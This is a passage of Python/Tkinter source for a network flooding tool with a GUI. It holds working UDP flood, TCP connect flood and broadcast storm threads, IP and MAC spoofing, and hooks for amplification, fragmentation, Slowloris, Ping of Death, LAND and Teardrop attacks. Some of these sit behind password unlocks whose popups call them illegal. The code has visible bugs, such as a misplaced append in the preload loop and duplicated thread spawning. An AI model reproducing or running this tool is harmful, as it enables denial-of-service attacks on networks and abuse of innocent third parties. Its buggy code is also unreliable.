        infinite_preload_frame.pack(fill='x', pady=5)
        ttk.Label(infinite_preload_frame, text="∞ Infinite Preload", font=('Segoe UI', 9)).pack(side='left')
        self.infinite_preload_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(infinite_preload_frame, variable=self.infinite_preload_var,
                       command=self.update_infinite_preload).pack(side='right')
        
        preload_count_frame = ttk.Frame(advanced_frame)
        preload_count_frame.pack(fill='x', pady=2)
        self.preload_count_label = ttk.Label(preload_count_frame, text="Preload Count:", font=('Segoe UI', 9))
        self.preload_count_label.pack(side='left')
        self.preload_count_var = tk.IntVar(value=1000)
        self.preload_spin = tk.Spinbox(preload_count_frame, from_=100, to=100000, increment=100,
                                 textvariable=self.preload_count_var, font=('Consolas', 9),
                                 width=8, command=self.update_preload_count)
        self.preload_spin.pack(side='right')
        
        preload_btn = tk.Button(advanced_frame, text="Preload Packets Now",
                               command=self.preload_packets_now,
                               bg=self.accent_color, fg='white', font=('Segoe UI', 9),
                               relief='flat', cursor='hand2')
        preload_btn.pack(fill='x', pady=5)
        
        self.preload_status = ttk.Label(advanced_frame, text="Packets ready: 0",
                                       font=('Consolas', 9), foreground=self.warning_color)
        self.preload_status.pack(anchor='w', pady=2)
        
        # Network Info
        network_frame = ttk.LabelFrame(left_column, text="NETWORK INFORMATION", padding=15)
        network_frame.pack(fill='x', pady=(0, 10))
        
        self.network_label = ttk.Label(network_frame, text="Interface: Detecting...", font=('Consolas', 9))
        self.network_label.pack(anchor='w', pady=2)
        
        self.ping_target_frame = ttk.Frame(network_frame)
        self.ping_target_frame.pack(fill='x', pady=5)
        ttk.Label(self.ping_target_frame, text="Ping Target:", font=('Segoe UI', 9)).pack(side='left')
        self.ping_target_entry = tk.Entry(self.ping_target_frame, font=('Consolas', 9), width=15)
        self.ping_target_entry.insert(0, "8.8.8.8")
        self.ping_target_entry.pack(side='left', padx=5)
        self.ping_target_entry.bind('<Return>', lambda e: self.update_ping_target())
        
        admin_text = "Admin Rights: YES" if self.is_admin else "Admin Rights: NO (Limited)"
        admin_color = self.success_color if self.is_admin else self.danger_color
        self.admin_label = ttk.Label(network_frame, text=admin_text, font=('Segoe UI', 9, 'bold'),
                                    foreground=admin_color)
        self.admin_label.pack(anchor='w', pady=2)
        
        # === RIGHT COLUMN CONTENT ===
        
        # Real-time Statistics
        stats_frame = ttk.LabelFrame(right_column, text="REAL-TIME STATISTICS", padding=15)
        stats_frame.pack(fill='x', pady=(0, 10))
        
        # Status
        status_container = ttk.Frame(stats_frame)
        status_container.pack(fill='x', pady=5)
        ttk.Label(status_container, text="Status:", font=('Segoe UI', 10)).pack(side='left')
        self.status_label = ttk.Label(status_container, text="Idle", font=('Segoe UI', 10, 'bold'),
                                     foreground=self.warning_color)
        self.status_label.pack(side='left', padx=10)
        
        # Create stats grid
        stats_grid = ttk.Frame(stats_frame)
        stats_grid.pack(fill='x', pady=10)
        
        # Packets sent
        packets_frame = ttk.Frame(stats_grid)
        packets_frame.pack(fill='x', pady=3)
        ttk.Label(packets_frame, text="Packets Sent:", font=('Segoe UI', 10)).pack(side='left')
        self.packets_label = ttk.Label(packets_frame, text="0", style='Stat.TLabel')
        self.packets_label.pack(side='right')
        
        # Packet rate
        pps_frame = ttk.Frame(stats_grid)
        pps_frame.pack(fill='x', pady=3)
        ttk.Label(pps_frame, text="Packet Rate:", font=('Segoe UI', 10)).pack(side='left')
        self.rate_label = ttk.Label(pps_frame, text="0 pps", style='Stat.TLabel')
        self.rate_label.pack(side='right')
        
        # Bandwidth
        bandwidth_frame = ttk.Frame(stats_grid)
        bandwidth_frame.pack(fill='x', pady=3)
        ttk.Label(bandwidth_frame, text="Bandwidth:", font=('Segoe UI', 10)).pack(side='left')
        self.bandwidth_label = ttk.Label(bandwidth_frame, text="0 KB/s", style='Stat.TLabel')
        self.bandwidth_label.pack(side='right')
        
        # Data sent
        data_frame = ttk.Frame(stats_grid)
        data_frame.pack(fill='x', pady=3)
        ttk.Label(data_frame, text="Data Sent:", font=('Segoe UI', 10)).pack(side='left')
        self.data_label = ttk.Label(data_frame, text="0 KB", style='Stat.TLabel')
        self.data_label.pack(side='right')
        
        # Duration
        time_frame = ttk.Frame(stats_grid)
        time_frame.pack(fill='x', pady=3)
        ttk.Label(time_frame, text="Duration:", font=('Segoe UI', 10)).pack(side='left')
        self.time_label = ttk.Label(time_frame, text="0s", style='Stat.TLabel')
        self.time_label.pack(side='right')
        
        # Network Performance
        perf_frame = ttk.LabelFrame(right_column, text="NETWORK PERFORMANCE", padding=15)
        perf_frame.pack(fill='x', pady=(0, 10))
        
        # Ping
        ping_container = ttk.Frame(perf_frame)
        ping_container.pack(fill='x', pady=3)
        ttk.Label(ping_container, text="Ping:", font=('Segoe UI', 10)).pack(side='left')
        self.ping_label = ttk.Label(ping_container, text="Measuring...", style='Stat.TLabel')
        self.ping_label.pack(side='right')
        
        # Thread count
        threads_container = ttk.Frame(perf_frame)
        threads_container.pack(fill='x', pady=3)
        ttk.Label(threads_container, text="Active Threads:", font=('Segoe UI', 10)).pack(side='left')
        self.threads_label = ttk.Label(threads_container, text="0", style='Stat.TLabel')
        self.threads_label.pack(side='right')
        
        # Attack Log
        log_frame = ttk.LabelFrame(right_column, text="ACTIVITY LOG", padding=15)
        log_frame.pack(fill='both', expand=True)
        log_frame.grid_rowconfigure(0, weight=1)
        log_frame.grid_columnconfigure(0, weight=1)
        
        # Create scrolled text widget
        log_scroll = ttk.Scrollbar(log_frame)
        log_scroll.grid(row=0, column=1, sticky='ns')
        
        self.log_text = tk.Text(log_frame, height=15, bg='#0a0a0a', fg='#00ff00',
                               font=('Consolas', 9), wrap='word', yscrollcommand=log_scroll.set)
        self.log_text.grid(row=0, column=0, sticky='nsew')
        log_scroll.config(command=self.log_text.yview)
        
        self.log_message("System initialized", "INFO")
        self.log_message("Awaiting attack configuration...", "INFO")
    
    def log_message(self, message, level="INFO"):
        """Add message to activity log"""
        timestamp = time.strftime("%H:%M:%S")
        color_map = {
            "INFO": "#00ff00",
            "WARNING": "#ffff00",
            "ERROR": "#ff0000",
            "ATTACK": "#ff00ff"
        }
        
        self.log_text.insert('end', f"[{timestamp}] ", 'timestamp')
        self.log_text.insert('end', f"[{level}] ", level)
        self.log_text.insert('end', f"{message}\n")
        
        self.log_text.tag_config('timestamp', foreground='#888888')
        self.log_text.tag_config(level, foreground=color_map.get(level, '#00ff00'))
        
        self.log_text.see('end')
        
        # Limit log size
        if int(self.log_text.index('end-1c').split('.')[0]) > 500:
            self.log_text.delete('1.0', '100.0')
    
    def update_ping_target(self):
        """Update ping target from entry"""
        new_target = self.ping_target_entry.get().strip()
        if new_target:
            self.ping_target = new_target
            self.log_message(f"Ping target changed to {new_target}", "INFO")
    
    def start_ping_monitor(self):
        """Start ping monitoring in background"""
        self.ping_monitoring = True
        threading.Thread(target=self.ping_monitor_thread, daemon=True).start()
    
    def ping_monitor_thread(self):
        """Monitor ping in background"""
        while self.ping_monitoring:
            try:
                if platform.system().lower() == "windows":
                    result = subprocess.run(['ping', '-n', '1', '-w', '1000', self.ping_target],
                                          capture_output=True, text=True, timeout=2)
                    
                    # Parse ping result
                    if result.returncode == 0:
                        match = re.search(r'time[=<](\d+)ms', result.stdout)
                        if match:
                            self.current_ping = int(match.group(1))
                        else:
                            # Check for <1ms
                            if 'time<1ms' in result.stdout:
                                self.current_ping = 0
                            else:
                                self.current_ping = -1
                    else:
                        self.current_ping = -1
                else:
                    self.current_ping = -1
                    
            except:
                self.current_ping = -1
            
            time.sleep(2)  # Ping every 2 seconds
    
    def format_bytes(self, bytes_val):
        """Format bytes to human readable"""
        for unit in ['B', 'KB', 'MB', 'GB']:
            if bytes_val < 1024.0:
                return f"{bytes_val:.2f} {unit}"
            bytes_val /= 1024.0
        return f"{bytes_val:.2f} TB"
    
    def update_packet_size(self):
        """Update packet size settings"""
        self.packet_size_min = self.packet_size_min_var.get()
        self.packet_size_max = self.packet_size_max_var.get()
        
        # Ensure min <= max
        if self.packet_size_min > self.packet_size_max:
            self.packet_size_min_var.set(self.packet_size_max)
            self.packet_size_min = self.packet_size_max
        
        self.log_message(f"Packet size range: {self.packet_size_min}-{self.packet_size_max} bytes", "INFO")
    
    def set_packet_size_preset(self, min_size, max_size):
        """Set packet size preset"""
        self.packet_size_min_var.set(min_size)
        self.packet_size_max_var.set(max_size)
        self.update_packet_size()
    
    def update_send_rate(self, value):
        """Update send rate setting"""
        self.send_rate = int(float(value))
        self.rate_value_label.config(text=f"{self.send_rate}")
        self.log_message(f"Send rate: {self.send_rate} pps/thread", "INFO")
    
    def update_burst_size(self, value):
        """Update burst size setting"""
        self.burst_size = int(float(value))
        self.burst_value_label.config(text=f"{self.burst_size}")
        self.log_message(f"Burst size: {self.burst_size} packets", "INFO")
    
    def update_thread_multiplier(self, value):
        """Update thread multiplier setting"""
        self.thread_multiplier = int(float(value))
        self.thread_value_label.config(text=f"{self.thread_multiplier}x")
        self.log_message(f"Thread multiplier: {self.thread_multiplier}x", "INFO")
    
    def update_preload_setting(self):
        """Update preload enable/disable"""
        self.preload_enabled = self.preload_var.get()
        status = "enabled" if self.preload_enabled else "disabled"
        self.log_message(f"Packet preloading {status}", "INFO")
    
    def update_infinite_preload(self):
        """Toggle infinite preload mode"""
        if self.infinite_preload_var.get():
            self.preload_count_label.config(text="∞ Infinite:")
            self.preload_spin.config(state='disabled')
            self.log_message("Infinite preload mode enabled - will preload continuously", "WARNING")
        else:
            self.preload_count_label.config(text="Preload Count:")
            self.preload_spin.config(state='normal')
            self.log_message("Infinite preload mode disabled", "INFO")
    
    def update_preload_count(self):
        """Update preload count"""
        self.preload_count = self.preload_count_var.get()
        self.log_message(f"Preload count: {self.preload_count} packets", "INFO")
    
    def preload_packets_now(self):
        """Preload packets into memory"""
        if self.infinite_preload_var.get():
            self.log_message("Starting INFINITE packet preloading...", "WARNING")
        else:
            self.log_message(f"Preloading {self.preload_count} packets into memory...", "INFO")
        threading.Thread(target=self._preload_packets_thread, daemon=True).start()
    
    def _preload_packets_thread(self):
        """Thread to preload packets"""
        self.preloaded_packets = []
        
        if self.infinite_preload_var.get():
            # Infinite preloading mode
            count = 0
            while self.preload_enabled:
                size = random.randint(self.packet_size_min, self.packet_size_max)
                packet_data = bytes(random.getrandbits(8) for _ in range(size))
                self.preloaded_packets.append(packet_data)
                count += 1
                
                if count % 1000 == 0:
                    self.log_message(f"Preloaded {count} packets (∞ mode)...", "INFO")
                
                # Small delay to prevent memory exhaustion too quickly
                if count % 10000 == 0:
                    time.sleep(0.1)
            
            self.log_message(f"Infinite preload stopped. Total: {count} packets", "SUCCESS")
        else:
            # Normal preloading mode
            for i in range(self.preload_count):
                # Generate random packet data
                size = random.randint(self.packet_size_min, self.packet_size_max)
                packet_data = bytes(random.getrandbits(8) for _ in range(size))
            
            # Store packet with metadata
            self.preloaded_packets.append({
                'data': packet_data,
                'size': size,
                'target': f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}",
                'port': random.randint(1, 65535)
            })
            
            # Update status every 100 packets
            if (i + 1) % 100 == 0:
                self.after(0, lambda count=i+1: self.preload_status.config(
                    text=f"Packets ready: {count}/{self.preload_count}"))
        
        total_bytes = sum(p['size'] for p in self.preloaded_packets)
        self.after(0, lambda: self.preload_status.config(
            text=f"Packets ready: {len(self.preloaded_packets)} ({self.format_bytes(total_bytes)})",
            foreground=self.success_color))
        self.after(0, lambda: self.log_message(
            f"Preloaded {len(self.preloaded_packets)} packets ({self.format_bytes(total_bytes)})", "INFO"))
    
    def detect_network_interface(self):
        """Detect active network interface on Windows"""
        try:
            # Get active network adapters using ipconfig
            result = subprocess.run(['ipconfig', '/all'], 
                                  capture_output=True, text=True, timeout=5)
            
            # Parse output to find active adapter
            lines = result.stdout.split('\n')
            current_adapter = None
            
            for i, line in enumerate(lines):
                # Look for adapter headers
                if 'adapter' in line.lower() and ':' in line:
                    current_adapter = line.split(':')[0].strip()
                
                # Look for MAC address (Physical Address)
                if 'Physical Address' in line and current_adapter:
                    mac_match = re.search(r'([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})', line)
                    if mac_match and not line.strip().endswith('N/A'):
                        self.current_interface = current_adapter
                        self.current_mac = mac_match.group(0).replace('-', ':')
                        if not self.original_mac:
                            self.original_mac = self.current_mac
                        break
            
            if not self.current_interface:
                # Fallback: just get first network adapter
                self.current_interface = "Default Network Adapter"
            
            self.generate_spoofed_identifiers()
            self.update_network_display()
            
        except Exception as e:
            print(f"Error detecting interface: {e}")
            self.current_interface = "Unknown"
            self.generate_spoofed_identifiers()
    
    def get_current_mac(self):
        """Get current MAC address on Windows"""
        if not self.current_mac:
            self.detect_network_interface()
    
    def generate_random_mac(self):
        """Generate random MAC address"""
        mac = [0x02,  # Locally administered
               random.randint(0x00, 0xff),
               random.randint(0x00, 0xff),
               random.randint(0x00, 0xff),
               random.randint(0x00, 0xff),
               random.randint(0x00, 0xff)]
        return ':'.join([f'{x:02x}' for x in mac])
    
    def generate_spoofed_identifiers(self):
        """Generate spoofed IP and MAC for packets"""
        self.spoofed_ip = f"{random.randint(10, 200)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
        self.spoofed_mac = self.generate_random_mac()
        self.after(0, self.update_spoof_display)
    
    def update_network_display(self):
        """Update network info display"""
        if self.current_interface:
            self.network_label.config(text=f"Interface: {self.current_interface}")
            self.mac_status.config(text=f"Current MAC: {self.current_mac or 'Unknown'}")
    
    def update_spoof_display(self):
        """Update spoofing info display"""
        self.spoof_status.config(text=f"Spoofed IP: {self.spoofed_ip} | MAC: {self.spoofed_mac}")
    
    def on_mac_toggle(self):
        """Handle MAC randomization toggle"""
        self.mac_randomization = self.mac_var.get()
    
    def on_randomize_mac_now(self):
        """Randomize MAC address immediately (Windows)"""
        if not self.is_admin:
            messagebox.showerror("Admin Required",
                               "This feature requires administrator privileges.\n\n"
                               "Please run this program as Administrator.")
            return
        
        new_mac = self.generate_random_mac()
        
        response = messagebox.askyesno("Change MAC Address?",
            f"This will temporarily disconnect you from the network.\n\n"
            f"Interface: {self.current_interface}\n"
            f"Current MAC: {self.current_mac}\n"
            f"New MAC: {new_mac}\n\n"
            f"Note: Windows MAC changing requires third-party tools or registry edits.\n"
            f"This will simulate MAC spoofing at the packet level instead.")
        
        if response:
            # On Windows, we simulate MAC spoofing in packets rather than changing adapter MAC
            # which requires registry edits or third-party tools
            self.spoofed_mac = new_mac
            self.update_spoof_display()
            messagebox.showinfo("MAC Spoofing Enabled",
                              f"Packet-level MAC spoofing enabled with {new_mac}\n\n"
                              f"All attack packets will use this spoofed MAC address.")
    
    def change_mac_address(self, new_mac):
        """Simulate MAC address change on Windows (packet-level spoofing)"""
        # Windows MAC changing is complex and requires registry edits or third-party tools
        # Instead, we use the spoofed MAC in our attack packets
        self.spoofed_mac = new_mac
        self.after(0, self.update_spoof_display)
        self.after(0, lambda: messagebox.showinfo(
            "MAC Spoofing Active",
            f"Packet-level MAC spoofing activated: {new_mac}\n\n"
            f"Attack traffic will use this spoofed MAC."
        ))
    
    def on_obfuscation_toggle(self):
        """Handle traffic obfuscation toggle"""
        self.traffic_obfuscation = self.obfus_var.get()
    
    def on_preset_click(self, level):
        """Handle preset intensity clicks"""
        self.intensity_var.set(level)
        self.on_intensity_changed(None)
    
    def set_safe_mode(self):
        """Enable only non-admin attack vectors"""
        # Highlight active tab
        self.mode_safe_btn.config(bg='#2c5c2c', relief='flat')
        self.mode_custom_btn.config(bg='#2c2c2c', relief='flat')
        
        # Enable safe vectors (no admin required)
        self.vector_udp_var.set(True)
        self.vector_tcp_var.set(True)
        self.vector_broadcast_var.set(True)
        self.vector_slowloris_var.set(True)
        
        # Disable password-protected vectors (require unlock)
        self.vector_dns_var.set(False)
        self.vector_ntp_var.set(False)
        self.vector_ssdp_var.set(False)
        self.vector_fragmentation_var.set(False)
        self.vector_ping_death_var.set(False)
        self.vector_land_var.set(False)
        self.vector_teardrop_var.set(False)
        
        self.log_message("Mode: No Admin Required - All safe vectors enabled", "SUCCESS")
    
    def set_custom_mode(self):
        """Set custom mode - user controls vectors manually"""
        # Highlight active tab
        self.mode_safe_btn.config(bg='#2c2c2c', relief='flat')
        self.mode_custom_btn.config(bg='#2c4c5c', relief='flat')
        
        self.log_message("Mode: Custom - Manually select attack vectors", "INFO")
    
    def show_info(self, title, message):
        """Show info popup for attack vectors"""
        import tkinter.messagebox as msgbox
        msgbox.showinfo(title, message)
    
    def on_amp_entry_change(self, event=None):
        """Handle amplification password entry changes"""
        if self.amp_failed_attempts >= 3:
            self.amp_entry_var.set("")
            return
        
        # Limit to digits only
        current = self.amp_entry_var.get()
        filtered = ''.join(filter(str.isdigit, current))
        if filtered != current:
            self.amp_entry_var.set(filtered)
    
    def check_amp_password(self):
        """Check amplification password"""
        if self.amp_failed_attempts >= 3:
            return
        
        entered = self.amp_entry_var.get()
        entered_code = [int(d) for d in entered]
        
        if entered_code == self.amp_code:
            self.unlock_amplification_attacks()
        else:
            self.amp_failed_attempts += 1
            remaining = 3 - self.amp_failed_attempts
            
            if self.amp_failed_attempts >= 3:
                self.activity_log.insert('1.0', f"❌ AMPLIFICATION LOCKOUT: Maximum attempts exceeded. Restart required.\n", 'error')
                self.amp_unlock_label.config(text="🔒 LOCKED", foreground='#ff0000')
                self.amp_entry.config(state='disabled', bg='#1a1a1a')
            else:
                self.activity_log.insert('1.0', f"⚠️ Wrong amplification password! {remaining} attempt(s) remaining.\n", 'warning')
                self.amp_entry.config(bg='#5c1f1f')
                self.after(200, lambda: self.amp_entry.config(bg='#3d2c1f'))
            
            self.amp_entry_var.set("")
    
    def on_dest_entry_change(self, event=None):
        """Handle destructive password entry changes"""
        if self.failed_attempts >= 3:
            self.dest_entry_var.set("")
            return
        
        # Limit to digits only
        current = self.dest_entry_var.get()
        filtered = ''.join(filter(str.isdigit, current))
        if filtered != current:
            self.dest_entry_var.set(filtered)
    
    def check_dest_password(self):
        """Check destructive password"""
        if self.failed_attempts >= 3:
            return
        
        entered = self.dest_entry_var.get()
        entered_code = [int(d) for d in entered]
        
        if entered_code == self.secret_code:
            self.unlock_destructive_attacks()
        else:
            self.failed_attempts += 1
            remaining = 3 - self.failed_attempts
            
            if self.failed_attempts >= 3:
                self.activity_log.insert('1.0', f"❌ DESTRUCTIVE LOCKOUT: Maximum attempts exceeded. Restart required.\n", 'error')
                self.unlock_label.config(text="🔒 LOCKED", foreground='#ff0000')
                self.dest_entry.config(state='disabled', bg='#1a1a1a')
            else:
                self.activity_log.insert('1.0', f"⚠️ Wrong destructive password! {remaining} attempt(s) remaining.\n", 'warning')
                self.dest_entry.config(bg='#5c1f1f')
                self.after(200, lambda: self.dest_entry.config(bg='#5c2c2c'))
            
            self.dest_entry_var.set("")
    
    def secret_input(self, num):
        """Handle secret code input for destructive attacks unlock (DEPRECATED - kept for compatibility)"""
        pass
    
    def amp_secret_input(self, num):
        """Handle secret code input for amplification attacks unlock (DEPRECATED - kept for compatibility)"""
        pass
    
    def unlock_amplification_attacks(self):
        """Unlock and show amplification attacks"""
        self.amplification_unlocked = True
        self.amp_unlock_label.config(text="✓ UNLOCKED", foreground='#00ff00')
        self.amp_entry.config(state='disabled', show="", bg='#1a4d1a')
        self.amp_entry_var.set("UNLOCKED")
        
        # Show warning popup
        messagebox.showwarning("⚠️ LEGAL WARNING", 
                              "⚠️ AMPLIFICATION ATTACKS UNLOCKED ⚠️\n\n"
                              "These attacks are ILLEGAL:\n"
                              "• Violate computer fraud laws\n"
                              "• Constitute network abuse\n"
                              "• Reflect through innocent 3rd parties\n"
                              "• Can result in criminal prosecution\n\n"
                              "Use ONLY in authorized test environments.\n"
                              "You assume ALL legal responsibility.")
        
        # Show amplification attacks container
        self.amplification_container.pack(fill='x', pady=10)
        
        self.activity_log.insert('1.0', "⚠️ AMPLIFICATION ATTACKS UNLOCKED - Illegal in most jurisdictions!\n", 'warning')
    
    def unlock_destructive_attacks(self):
        """Unlock and show destructive attacks"""
        self.destructive_unlocked = True
        self.unlock_label.config(text="✓ UNLOCKED", foreground='#00ff00')
        self.dest_entry.config(state='disabled', show="", bg='#1a4d1a')
        self.dest_entry_var.set("UNLOCKED")
        
        # Show warning popup
        messagebox.showwarning("⚠️ WARNING", 
                              "⚠️ DESTRUCTIVE ATTACKS UNLOCKED ⚠️\n\n"
                              "These attacks can:\n"
                              "• Crash network devices\n"
                              "• Cause system instability\n"
                              "• Require admin/root privileges\n"
                              "• Violate laws and regulations\n\n"
                              "Use ONLY in authorized test environments.\n"
                              "You assume ALL legal responsibility.")
        
        # Show destructive attacks container
        self.destructive_container.pack(fill='x', pady=10)
        
        self.activity_log.insert('1.0', "⚠️ DESTRUCTIVE ATTACKS UNLOCKED - Use with extreme caution!\n", 'warning')
    
    def on_intensity_changed(self, event):
        """Handle intensity slider change"""
        self.intensity = int(self.intensity_var.get())
        percent = self.intensity * 10
        self.intensity_label.config(text=f"Level {self.intensity} ({percent}%)")
        # Switch to custom mode when user adjusts settings
        self.set_custom_mode()
    
    def on_attack_toggle(self):
        """Toggle attack on/off"""
        if not self.attack_active:
            self.start_attack()
        else:
            self.stop_attack()
    
    def start_attack(self):
        """Start the attack"""
        self.attack_active = True
        self.start_time = time.time()
        self.packets_sent = 0
        self.bytes_sent = 0
        self.last_packet_count = 0
        self.last_byte_count = 0
        self.last_update_time = time.time()
        
        self.attack_button.config(text="STOP ATTACK", bg=self.danger_color)
        self.status_label.config(text="ATTACKING", foreground=self.danger_color)
        
        self.log_message("Attack initiated", "ATTACK")
        self.log_message(f"Intensity level: {self.intensity}/10", "ATTACK")
        self.log_message(f"Packet size: {self.packet_size_min}-{self.packet_size_max} bytes", "ATTACK")
        self.log_message(f"Send rate: {self.send_rate} pps/thread", "ATTACK")
        self.log_message(f"Burst size: {self.burst_size} packets", "ATTACK")
        
        self.generate_spoofed_identifiers()
        
        # Preload packets if enabled and not already loaded
        if self.preload_enabled and len(self.preloaded_packets) == 0:
            self.log_message("Auto-preloading packets for attack...", "INFO")
            self._preload_packets_thread()
        
        # Use customizable thread multiplier
        num_threads = self.intensity * self.thread_multiplier
        
        active_vectors = []
        if self.vector_udp_var.get():
            active_vectors.append("UDP Flood")
            for _ in range(num_threads):
                t = threading.Thread(target=self.udp_flood_attack, daemon=True)
                t.start()
                self.attack_threads.append(t)
        
        if self.vector_tcp_var.get():
            active_vectors.append("TCP SYN Flood")
            for _ in range(num_threads):
                t = threading.Thread(target=self.tcp_syn_attack, daemon=True)
                t.start()
                self.attack_threads.append(t)
        
        if self.vector_broadcast_var.get():
            active_vectors.append("Broadcast Storm")
            for _ in range(num_threads):
                t = threading.Thread(target=self.broadcast_storm_attack, daemon=True)
                t.start()
                self.attack_threads.append(t)
        
        if self.vector_fragmentation_var.get():
            active_vectors.append("IP Fragmentation")
            for _ in range(num_threads // 2):  # Less threads for raw socket attacks
                t = threading.Thread(target=self.fragmentation_bomb_attack, daemon=True)
                t.start()
                self.attack_threads.append(t)
        
        if self.vector_slowloris_var.get():
            active_vectors.append("Slowloris")
            for _ in range(min(5, num_threads)):  # Limit Slowloris threads
                t = threading.Thread(target=self.slowloris_attack, daemon=True)
                t.start()
                self.attack_threads.append(t)
        
        if self.vector_dns_var.get():
            active_vectors.append("DNS Amplification")
            for _ in range(num_threads):
                t = threading.Thread(target=self.dns_amplification_attack, daemon=True)
                t.start()
                self.attack_threads.append(t)
        
        if self.vector_ntp_var.get():
            active_vectors.append("NTP Amplification")
            for _ in range(num_threads):
                t = threading.Thread(target=self.ntp_amplification_attack, daemon=True)
                t.start()
                self.attack_threads.append(t)
        
        if self.vector_ssdp_var.get():
            active_vectors.append("SSDP Amplification")
            for _ in range(num_threads):
                t = threading.Thread(target=self.ssdp_amplification_attack, daemon=True)
                t.start()
                self.attack_threads.append(t)
        
        if self.vector_ping_death_var.get():
            active_vectors.append("Ping of Death")
            for _ in range(num_threads // 2):
                t = threading.Thread(target=self.ping_of_death_attack, daemon=True)
                t.start()
                self.attack_threads.append(t)
        
        if self.vector_land_var.get():
            active_vectors.append("LAND Attack")
            for _ in range(num_threads // 2):
                t = threading.Thread(target=self.land_attack, daemon=True)
                t.start()
                self.attack_threads.append(t)
        
        if self.vector_teardrop_var.get():
            active_vectors.append("Teardrop")
            for _ in range(num_threads // 2):
                t = threading.Thread(target=self.teardrop_attack, daemon=True)
                t.start()
                self.attack_threads.append(t)
        
        self.log_message(f"Vectors: {', '.join(active_vectors)}", "ATTACK")
        self.log_message(f"Spawned {len(self.attack_threads)} attack threads", "ATTACK")
        self.log_message(f"Target throughput: {num_threads * self.send_rate:,} pps", "ATTACK")
        
        if self.vector_tcp_var.get():
            for _ in range(num_threads):
                t = threading.Thread(target=self.tcp_syn_attack, daemon=True)
                t.start()
                self.attack_threads.append(t)
        
        if self.vector_broadcast_var.get():
            for _ in range(num_threads):
                t = threading.Thread(target=self.broadcast_storm_attack, daemon=True)
                t.start()
                self.attack_threads.append(t)
    
    def stop_attack(self):
        """Stop the attack"""
        self.attack_active = False
        
        self.attack_button.config(text="START ATTACK", bg=self.success_color)
        self.status_label.config(text="Idle", foreground=self.warning_color)
        
        self.log_message("Attack stopped", "WARNING")
        self.log_message(f"Total packets sent: {self.packets_sent:,}", "INFO")
        self.log_message(f"Total data sent: {self.format_bytes(self.bytes_sent)}", "INFO")
        
        self.attack_threads = []
    
    def udp_flood_attack(self):
        """UDP flood with preloaded packets and customizable settings"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 262144)  # 256KB send buffer
            
            # Calculate delay based on send rate
            delay_per_burst = self.burst_size / self.send_rate if self.send_rate > 0 else 0.001
            
            preload_index = 0
            
            while self.attack_active:
                try:
                    # Send burst of packets
                    for _ in range(self.burst_size):
                        if self.preload_enabled and len(self.preloaded_packets) > 0:
                            # Use preloaded packet
                            packet = self.preloaded_packets[preload_index % len(self.preloaded_packets)]
                            sock.sendto(packet['data'], (packet['target'], packet['port']))
                            size = packet['size']
                            preload_index += 1
                        else:
                            # Generate packet on the fly
                            port = random.randint(1, 65535)
                            size = random.randint(self.packet_size_min, self.packet_size_max)
                            target = f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}"
                            
                            payload = bytes(random.getrandbits(8) for _ in range(size))
                            sock.sendto(payload, (target, port))
                        
                        self.packets_sent += 1
                        self.bytes_sent += size
                    
                    # Adaptive delay based on send rate
                    if delay_per_burst > 0:
                        time.sleep(delay_per_burst)
                except:
                    pass
            
            sock.close()
        except:
            pass
    
    def tcp_syn_attack(self):
        """TCP SYN flood with customizable send rate"""
        try:
            # Calculate delay based on send rate
            delay_per_burst = self.burst_size / self.send_rate if self.send_rate > 0 else 0.001
            
            while self.attack_active:
                try:
                    # Create bursts of connections
                    for _ in range(self.burst_size):
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(0.01)  # Very short timeout
                        
                        port = random.randint(1, 65535)
                        target = f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}"
                        
                        try:
                            sock.connect((target, port))
                        except:
                            pass
                        
                        sock.close()
                        self.packets_sent += 1
                        self.bytes_sent += 60  # Approximate TCP SYN packet size
                    
                    # Adaptive delay
                    if delay_per_burst > 0:
                        time.sleep(delay_per_burst)
                except:
                    pass
        except:
            pass
    
    def broadcast_storm_attack(self):
        """Broadcast storm with preloaded packets and customizable settings"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 262144)  # 256KB send buffer
            
            # Calculate delay based on send rate
            delay_per_burst = self.burst_size / self.send_rate if self.send_rate > 0 else 0.001
            
            preload_index = 0
            
            while self.attack_active:
                try:
                    # Send burst of broadcast packets
                    for _ in range(self.burst_size):
                        if self.preload_enabled and len(self.preloaded_packets) > 0:
                            # Use preloaded packet
                            packet = self.preloaded_packets[preload_index % len(self.preloaded_packets)]
                            sock.sendto(packet['data'], ("255.255.255.255", packet['port']))
                            size = packet['size']
                            preload_index += 1
                        else:
                            # Generate packet on the fly
                            size = random.randint(self.packet_size_min, self.packet_size_max)
                            payload = bytes(random.getrandbits(8) for _ in range(size))
                            port = random.randint(1, 65535)
                            sock.sendto(payload, ("255.255.255.255", port))
                        
                        self.packets_sent += 1
                        self.bytes_sent += size
                    
                    # Adaptive delay
                    if delay_per_burst > 0:
                        time.sleep(delay_per_burst)
                except:
                    pass
            
            sock.close()
        except:
            pass
    
    def fragmentation_bomb_attack(self):
        """IP fragmentation bomb - sends malformed fragmented packets to overwhelm reassembly buffers"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            
            while self.attack_active:
                try:
                    target = self.target_ip
                    # Create overlapping fragmented packets
                    for offset in range(0, 65535, 8):
                        fragment = self.craft_fragment(target, offset, overlap=True)
                        sock.sendto(fragment, (target, 0))
                        self.packets_sent += 1
                        self.bytes_sent += len(fragment)
                    time.sleep(0.001)
                except:
                    pass
        except Exception as e:
            self.log_message(f"Fragmentation attack failed (needs admin): {e}", "ERROR")
    
    def slowloris_attack(self):
        """Slowloris - keeps connections open by sending partial HTTP requests"""
        connections = []
        headers = [
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Accept: text/html,application/xhtml+xml",
            "Accept-Language: en-US,en;q=0.5",
            "Accept-Encoding: gzip, deflate",
            "Connection: keep-alive",
            "Keep-Alive: timeout=900"
